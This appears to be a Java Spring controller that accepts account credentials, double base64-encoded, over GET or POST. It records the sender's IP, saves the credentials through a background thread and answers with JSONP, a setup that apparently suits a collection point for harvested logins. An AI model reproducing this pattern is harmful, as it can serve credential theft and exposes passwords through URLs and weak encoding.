package cc.ussu.modules.dczx.api;

import cc.ussu.common.core.vo.JsonResult;
import cc.ussu.modules.dczx.base.BaseDczxController;
import cc.ussu.modules.dczx.thread.SaveUserInfoThread;
import cc.ussu.modules.dczx.util.JsonpUtil;
import cn.hutool.core.codec.Base64;
import cn.hutool.core.text.StrPool;
import cn.hutool.core.util.StrUtil;
import cn.hutool.extra.servlet.ServletUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import java.util.List;

/**
 * 获取通过cookie获取相关信息
 */
@RestController
@RequestMapping("/api/dczx/up")
public class GetUserInfoApiController extends BaseDczxController {

    @Autowired
    private ThreadPoolTaskExecutor threadPoolTaskExecutor;

    /**
     * 采集用户信息（通过上传的账号信息）
     * @param d
     */
    // @Operation(description = "上传账号信息")
    @RequestMapping(method = {RequestMethod.GET, RequestMethod.POST})
    public void up(String d) {
        if (StrUtil.isNotBlank(d)) {
            String s = Base64.decodeStr(Base64.decodeStr(d));
            if (StrUtil.isNotBlank(s)) {
                List<String> up = StrUtil.split(s, StrPool.COMMA);
                if (up.size() >= 2) {
                    String username = up.get(0);
                    String pwd = up.get(1);
                    String clientIP = ServletUtil.getClientIP(request);
                    // String valueByKey = sysParamService.getValueByKey("");
                    SaveUserInfoThread saveUserInfoThread = new SaveUserInfoThread(username, pwd, clientIP);
                    threadPoolTaskExecutor.submit(saveUserInfoThread);
                }
            }
        }
        ServletUtil.write(response, JsonpUtil.render(JsonResult.ok()), TEXT_PLAIN);
    }

}
